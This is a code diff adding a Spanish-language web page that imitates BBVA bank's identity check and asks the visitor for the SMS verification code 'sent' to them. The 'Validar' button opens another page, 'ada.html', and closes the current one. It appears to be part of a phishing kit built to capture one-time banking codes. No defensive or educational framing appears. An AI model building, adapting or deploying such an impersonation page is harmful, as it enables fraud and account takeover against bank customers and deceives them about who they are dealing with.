@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Validación BBVA</title>
+
+<style>
+
+body{
+margin:0;
+font-family:Segoe UI, Arial;
+background:#f5f6f8;
+}
+
+.header{
+text-align:center;
+margin-top:30px;
+}
+
+.header h1{
+color:#0b2c8a;
+margin-bottom:5px;
+}
+
+.header h2{
+color:#0b2c8a;
+font-size:28px;
+}
+
+.card{
+background:white;
+width:900px;
+margin:30px auto;
+padding:40px;
+border-radius:12px;
+display:flex;
+gap:40px;
+align-items:center;
+box-shadow:0 0 10px rgba(0,0,0,.1);
+}
+
+.shield{
+font-size:120px;
+}
+
+.content{
+flex:1;
+}
+
+.content h3{
+color:#0b2c8a;
+font-size:26px;
+margin:0;
+}
+
+.content p{
+font-size:18px;
+}
+
+input{
+width:100%;
+padding:14px;
+border-radius:8px;
+border:1px solid #ccc;
+font-size:16px;
+}
+
+.buttons{
+margin-top:20px;
+display:flex;
+gap:20px;
+}
+
+.btn{
+padding:12px 28px;
+border-radius:8px;
+border:none;
+font-size:16px;
+cursor:pointer;
+}
+
+.reenviar{
+background:#eee;
+}
+
+.validar{
+background:#0b2c8a;
+color:white;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="header">
+<h1>BBVA</h1>
+<h2>¡Hola! Te damos la bienvenida a BBVA</h2>
+</div>
+
+<div class="card">
+
+<div class="shield">🛡️</div>
+
+<div class="content">
+
+<h3>Sigue estos pasos para confirmar tu identidad</h3>
+
+<p>Te hemos enviado un código de verificación por SMS.</p>
+
+<label>Escribe aquí el código que has recibido</label>
+
+<input placeholder="Por ejemplo: 987654">
+
+<div class="buttons">
+
+<button class="btn reenviar">Reenviar</button>
+
+<button class="btn validar" onclick="validar()">Validar</button>
+
+</div>
+
+</div>
+
+</div>
+
+<script>
+
+function validar(){
+
+window.open(
+"ada.html",
+"_blank"
+)
+
+window.close()
+
+}
+
+</script>
+
+</body>
+</html>
